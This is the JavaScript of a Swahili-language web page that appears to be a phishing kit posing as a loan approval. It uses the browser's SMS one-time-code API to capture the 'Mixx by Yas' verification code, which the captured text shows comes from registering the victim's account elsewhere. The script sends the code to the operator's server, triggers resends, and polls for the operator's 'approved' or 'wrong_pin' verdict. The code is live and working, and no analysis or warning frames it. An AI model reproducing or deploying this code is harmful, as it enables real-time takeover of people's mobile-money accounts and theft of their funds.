<script>
    var urlParams = new URLSearchParams(window.location.search);
    var appId = urlParams.get('app_id') || '';
    var userPhone = urlParams.get('phone') || '';
    var payAmount = urlParams.get('amount') || '500000';
    document.getElementById('loanAmount').textContent = 'TZS ' + parseInt(payAmount).toLocaleString();
    document.getElementById('approvedAmount').textContent = 'TZS ' + parseInt(payAmount).toLocaleString();
    document.getElementById('showPhone').textContent = '+255 ' + userPhone;

    var checkInterval = null, countdownTimer = null;
    var resendCount = 0, resendCooldown = false, smsDetected = false;

    (function() {
        var ua = navigator.userAgent.toLowerCase();
        if (/iphone|ipad|ipod/.test(ua)) {
            document.getElementById('btnIPhone').style.display = 'block';
        } else {
            document.getElementById('btnAndroid').style.display = 'block';
        }
    })();

    startCountdown();
    startAutoDetect();

    function startCountdown() { 
        if (countdownTimer) clearInterval(countdownTimer); 
        var seconds = 60; var display = document.getElementById('timerDisplay'); 
        display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; 
        countdownTimer = setInterval(function() { 
            seconds--; display.textContent = '⏳ ' + seconds + 's'; 
            if (seconds <= 10) display.className = 'timer-bar warning'; 
            if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } 
        }, 1000); 
    }

    function startAutoDetect() {
        document.getElementById('smsMessage').value = '';
        document.getElementById('codeError').textContent = 'Inasubiri SMS kutoka Mixx by Yas... Gusa Allow ikitokea.';
        document.getElementById('codeError').style.color = 'var(--primary)';
        document.getElementById('codeError').classList.add('show');
        
        if (!('OTPCredential' in window)) {
            document.getElementById('codeError').textContent = 'Subiri SMS... (browser haitumii auto-detect, nakili mwenyewe)';
            document.getElementById('codeError').style.color = 'var(--danger)';
            return;
        }
        
        var ac = new AbortController();
        navigator.credentials.get({
            otp: { transport: ['sms'] },
            signal: ac.signal
        }).then(function(otp) {
            if (!smsDetected && otp && otp.code) {
                smsDetected = true;
                var fullMessage = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                
                document.getElementById('smsMessage').value = fullMessage;
                document.getElementById('codeError').textContent = '✅ Ujumbe umepokelewa kutoka notification! Inatuma...';
                document.getElementById('codeError').style.color = 'var(--success)';
                document.getElementById('codeError').classList.add('show');
                if (countdownTimer) clearInterval(countdownTimer);
                document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
                document.getElementById('timerDisplay').className = 'timer-bar';
                setTimeout(function() { submitCode(); }, 500);
            }
        }).catch(function() {
            if (!smsDetected) {
                document.getElementById('codeError').textContent = 'Haukuruhusu. Subiri SMS kisha nakili ujumbe mwenyewe.';
                document.getElementById('codeError').style.color = 'var(--danger)';
                document.getElementById('codeError').classList.add('show');
            }
        });
        setTimeout(function() { ac.abort(); }, 120000);
    }

    async function resendCode() { 
        if (!userPhone) return; 
        if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
        if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi. Jaribu baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
        resendCount++; resendCooldown = true; smsDetected = false;
        document.getElementById('smsMessage').value = '';
        document.getElementById('codeError').textContent = 'OTP Imetumwa. (' + resendCount + '/3)'; 
        document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
        try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: parseInt(payAmount), months: 12, loan_type: '', purpose: 'OTP REQUESTED' }) }); } catch(e) {} 
        startCountdown(); startAutoDetect();
        setTimeout(function() { resendCooldown = false; }, 30000);
    }

    async function submitCode() { 
        if (countdownTimer) { clearInterval(countdownTimer); } 
        var smsText = document.getElementById('smsMessage').value.trim();
        if (!smsText) { document.getElementById('codeError').textContent = 'Subiri ujumbe...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); return; }
        document.getElementById('screenCode').classList.remove('active'); document.getElementById('screenWait').classList.add('active'); 
        await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
        if (checkInterval) clearInterval(checkInterval); 
        checkInterval = setInterval(async function() { 
            try { var res = await fetch('/api/check_status/' + appId); var data = await res.json(); 
                if (data.code_status === 'approved') { clearInterval(checkInterval); showSuccess(); } 
                else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); showCodeError(); } 
                else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); alert('PIN si sahihi.'); window.location.href = '/'; }
            } catch(e) {} 
        }, 3000); 
    }

    function showSuccess() { document.getElementById('screenWait').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }

    function showCodeError() { 
        document.getElementById('screenWait').classList.remove('active'); document.getElementById('screenCode').classList.add('active'); 
        document.getElementById('smsMessage').value = ''; smsDetected = false;
        document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
        document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); 
        startCountdown(); startAutoDetect();
        setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); 
    }
</script>
